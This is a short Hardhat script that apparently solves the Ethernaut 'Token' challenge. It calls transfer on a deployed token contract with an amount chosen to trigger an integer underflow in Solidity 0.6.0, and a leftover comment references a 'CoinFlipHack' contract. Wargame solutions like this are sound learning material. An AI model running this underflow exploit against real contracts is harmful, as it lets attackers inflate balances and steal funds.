const { ethers } = require("hardhat");
const hre = require("hardhat");

const main = async () => {
  /*const contractFactory = await hre.ethers.getContractFactory("CoinFlipHack");
  const contract = await contractFactory.deploy();
  await contract.deployed();
  console.log("=== contract deployed to ", contract.address);
  */
  const hackContractAddress = "0xE05384EF741d45FD53B47Ec38989c0Ede0e89b92";
  const hackContractName = "Token";
  const signer = await hre.ethers.getSigner();
  const contract = await hre.ethers.getContractAt(
    hackContractName,
    hackContractAddress,
    signer
  );
  // underflow and overflow for 0.6.0
  contract.transfer("0x4cEE6B545906e927Ea1f9f2f271f7db7e41328D9", 21);
  console.log("=== DONE ===");
};

const runMain = (async () => {
  try {
    await main();
    process.exit(0);
  } catch (error) {
    console.log(error);
    process.exit(1);
  }
})();
